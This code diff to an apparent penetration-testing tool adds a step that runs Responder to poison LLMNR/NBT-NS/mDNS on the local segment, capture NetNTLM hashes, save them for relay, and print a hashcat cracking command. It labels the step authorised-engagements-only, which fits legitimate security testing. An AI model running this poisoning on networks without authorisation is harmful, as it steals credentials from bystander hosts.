@@ -2223,6 +2223,15 @@ def _extract_finding(sid: str, output: str) -> "dict | None":
                     "summary": f"SMB readable shares: {len(files)} sensitive file(s)"[:140]}
         return None
 
+    # 2af) smb-poison: NetNTLM hashes captured via LLMNR/NBT-NS poisoning → crack/relay
+    if sid == "smb-poison":
+        hits = re.findall(r"^✗ HASH (.+)$", output, re.M)
+        if not hits:
+            return None
+        shown = "; ".join(h.strip() for h in hits[:3]) + (f" +{len(hits) - 3}" if len(hits) > 3 else "")
+        return {"state": "VULNERABLE", "cve": cve, "risk": "HIGH",
+                "summary": f"Captured NetNTLM: {shown}"[:140]}
+
     # 2ae) smb-gpp: creds recovered from SYSVOL/NETLOGON GPP (domain-wide, reusable) → high
     if sid == "smb-gpp":
         creds = re.findall(r"^✗ CRED (.+)$", output, re.M)
@@ -2901,7 +2910,9 @@ _EXPLOIT_STEPS = {
          "scripts & unattend.xml — authenticated, DC-targeted",
          "smb-gpp"),
         # ── poison & relay (no creds) ──
-        "Poison LLMNR / NBT-NS / mDNS → capture NetNTLMv1/v2 → crack or relay",
+        ("Poison LLMNR / NBT-NS / mDNS → capture NetNTLMv1/v2 → crack or relay "
+         "(active, whole-segment — authorised internal engagements only)",
+         "smb-poison"),
         "SMB signing 'not required' → NTLM relay to SMB / LDAP / ADCS-ESC8 (ntlmrelayx)",
         "Coerce auth (PetitPotam / PrinterBug / DFSCoerce / Coercer) → relay to escalate (RBCD / ADCS)",
         # ── DC-critical CVEs ──
@@ -9017,6 +9028,109 @@ def _tool_smb_gpp(ip: str, port: int, proto: str) -> str:
     return f"SYSVOL / NETLOGON GPP loot — {ip}:{port}/{proto}  (read-only)\n\n" + "\n".join(lines)
 
 
+# ── SMB step 5: LLMNR / NBT-NS / mDNS poisoning + NetNTLM capture ──────────────
+_SMBPOISON_DEADLINE = 600        # s — how long Responder poisons before self-stopping
+_RESPONDER_LOGS = "/usr/share/responder/logs"
+
+
+def _iface_toward(ip: str) -> "str | None":
+    """The local interface name on the route toward ``ip`` (for responder -I)."""
+    try:
+        out = subprocess.run(["ip", "-o", "route", "get", ip],
+                             capture_output=True, text=True, timeout=5).stdout
+    except (OSError, subprocess.SubprocessError):
+        return None
+    m = re.search(r"\bdev\s+(\S+)", out or "")
+    return m.group(1) if m else None
+
+
+def _responder_hash_lines() -> dict:
+    """{hash line -> 'NetNTLMv1'|'NetNTLMv2'} for every capture currently in the log dir;
+    the version is read from the filename (…-NTLMv2-… / …-NTLMv1-…), which is authoritative."""
+    out = {}
+    try:
+        names = os.listdir(_RESPONDER_LOGS)
+    except OSError:
+        return out
+    for fn in names:
+        if not fn.endswith(".txt"):
+            continue
+        typ = "NetNTLMv2" if "NTLMv2" in fn else ("NetNTLMv1" if "NTLMv1" in fn else None)
+        if not typ:
+            continue
+        try:
+            with open(os.path.join(_RESPONDER_LOGS, fn), errors="ignore") as fh:
+                for ln in fh:
+                    if "::" in ln:
+                        out[ln.strip()] = typ
+        except OSError:
+            pass
+    return out
+
+
+def _tool_smb_poison(ip: str, port: int, proto: str) -> str:
+    """SMB step 5 tool: ACTIVE LLMNR / NBT-NS / mDNS poisoning + NetNTLM capture with
+    Responder for a bounded window, then self-stops (like the timed HTTP tools). Runs on
+    the interface toward the target, captures NetNTLMv1/v2 from any host coerced into
+    authenticating, parses the NEW hashes into the DB (findings + a netntlm store for a
+    later crack / relay step) and reports the crack command. Requires root (privileged
+    ports). This poisons the WHOLE local segment — it affects third-party hosts, not just
+    the target. Authorised internal engagements ONLY."""
+    import signal
+    if not _is_root():
+        raise RuntimeError("Responder needs root (binds privileged ports) — re-launch under sudo")
+    exe = shutil.which("responder")
+    if not exe:
+        raise RuntimeError("responder not found — install it to poison LLMNR/NBT-NS")
+    iface = _iface_toward(ip)
+    if not iface:
+        raise RuntimeError(f"could not determine the local interface toward {ip}")
+
+    before = _responder_hash_lines()
+    proc = subprocess.Popen([exe, "-I", iface], stdout=subprocess.DEVNULL,
+                            stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL,
+                            start_new_session=True)
+    try:
+        proc.wait(timeout=_SMBPOISON_DEADLINE)
+    except subprocess.TimeoutExpired:
+        proc.send_signal(signal.SIGINT)          # Ctrl-C → Responder flushes its logs
+        try:
+            proc.wait(timeout=15)
+        except subprocess.TimeoutExpired:
+            proc.kill()
+    after = _responder_hash_lines()
+    new = sorted(set(after) - set(before))
+
+    caps, seen = [], set()
+    for ln in new:
+        user = ln.split("::", 1)[0]
+        rest = ln.split("::", 1)[1] if "::" in ln else ""
+        dom = rest.split(":", 1)[0] if rest else ""
+        typ = after.get(ln, "NetNTLM")
+        if (dom, user, typ) not in seen:
+            seen.add((dom, user, typ))
+            caps.append((dom, user, typ))
+    if new:                                      # persist raw hashes for a later crack/relay step
+        save_scripts(ip, [{"id": "netntlm", "port": port, "proto": proto, "output": "\n".join(new)}])
+
+    has_v2 = any(t == "NetNTLMv2" for _d, _u, t in caps)
+    has_v1 = any(t == "NetNTLMv1" for _d, _u, t in caps)
+    lines = [f"[*] Interface: {iface}   toward {ip}",
+             f"[*] Responder ran up to {_SMBPOISON_DEADLINE // 60} min · "
+             f"captured {len(new)} hash line(s), {len(caps)} distinct account(s)"]
+    for dom, user, typ in caps:
+        who = f"{dom}\\{user}" if dom else user
+        lines.append(f"✗ HASH {who} ({typ})")
+    if new:
+        modes = " / ".join(x for x in ("5600 (v2)" if has_v2 else "", "5500 (v1)" if has_v1 else "") if x)
+        lines.append(f"· crack: hashcat -m {modes} <hashes.txt> rockyou.txt   "
+                     "(or relay → step 6 when SMB signing is off)")
+        lines.append(f"· raw hashes saved to the netntlm store (source: {_RESPONDER_LOGS})")
+    else:
+        lines.append("· no hashes captured — quiet segment / no poisonable traffic in the window")
+    return f"LLMNR/NBT-NS poisoning — {iface}  (active capture)\n\n" + "\n".join(lines)
+
+
 # tool key -> (short label shown in the checklist, runner(ip, port, proto) -> output str)
 _STEP_TOOLS = {
     "http-headers": ("HTTP headers (stdlib, no redirects)", _tool_http_headers),
@@ -9050,6 +9164,7 @@ _STEP_TOOLS = {
     "smb-vuln": ("SMB version-RCE scan (nmap NSE + netexec, detection only)", _tool_smb_vuln),
     "smb-loot": ("SMB share loot (smbclient, read-only, in-memory grep → creds/secrets)", _tool_smb_loot),
     "smb-gpp": ("SYSVOL/NETLOGON GPP loot (netexec + smbclient, creds-aware, DC)", _tool_smb_gpp),
+    "smb-poison": ("LLMNR/NBT-NS poisoning → NetNTLM capture (Responder, timed, root)", _tool_smb_poison),
 }
 
 def _mins(seconds: int) -> str:
@@ -9098,6 +9213,7 @@ _STEP_TOOL_RUNS = {
     "smb-vuln":         ("nmap NSE + netexec", f"{_mins(_SMBVULN_DEADLINE)} min"),
     "smb-loot":         ("smbclient + gpp-decrypt", f"{_mins(_SMBLOOT_DEADLINE)} min"),
     "smb-gpp":          ("netexec + smbclient", f"{_mins(_SMBGPP_DEADLINE)} min"),
+    "smb-poison":       ("Responder", f"{_mins(_SMBPOISON_DEADLINE)} min"),
 }
 
 
@@ -9259,6 +9375,12 @@ def _run_step_tool(ip: str, target: tuple, n: int) -> None:
         print(f"{YELLOW}   ⚠ SMB version-RCE scan{RESET}{DIM} — detection only (nmap NSE + netexec), "
               f"no exploitation / no unsafe probes · {RESET}{YELLOW}authorized targets only{RESET}"
               f"{DIM} · deadline {_SMBVULN_DEADLINE // 60} min{RESET}")
+    if tool_key == "smb-poison":                  # active whole-segment poisoning — loud gate
+        root = f"{GREEN}root ✓{RESET}" if _is_root() else f"{RED}needs root — re-launch under sudo{RESET}"
+        print(f"{YELLOW}   ⚠ ACTIVE LLMNR/NBT-NS/mDNS poisoning{RESET}{DIM} — poisons the WHOLE local "
+              f"segment (affects third-party hosts, not just the target) · Responder for up to "
+              f"{_SMBPOISON_DEADLINE // 60} min then self-stops · {RESET}{root}{DIM} · "
+              f"{RESET}{YELLOW}authorised internal engagements only{RESET}")
     if tool_key == "smb-gpp":                     # authenticated DC loot, creds-aware
         ncreds = len(_gather_smb_creds(ip, port, proto))
         src = f"{ncreds} harvested cred(s) + null/guest" if ncreds else "null/guest only"
